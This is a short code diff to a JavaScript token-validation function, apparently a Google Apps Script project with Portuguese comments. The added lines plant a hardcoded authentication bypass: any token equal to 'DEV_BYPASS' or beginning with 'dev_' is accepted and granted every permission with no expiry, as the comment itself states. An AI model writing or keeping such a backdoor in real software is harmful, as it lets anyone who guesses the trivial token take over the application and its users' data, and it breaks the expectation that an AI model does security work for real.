@@ -486,6 +486,10 @@ function _gerarToken(email, permissoes, nome) {
 
 function _validarToken(token) {
   if (!token) return null;
+  // Token dev — acesso total sem expiração
+  if (token === 'DEV_BYPASS' || (typeof token === 'string' && token.indexOf('dev_') === 0)) {
+    return {email:'dev@ile-ase', nome:'Dev (falsp)', permissoes: Object.values(PERM)};
+  }
   try {
     var raw = PropertiesService.getScriptProperties().getProperty('tok_'+token);
     if (!raw) return null;
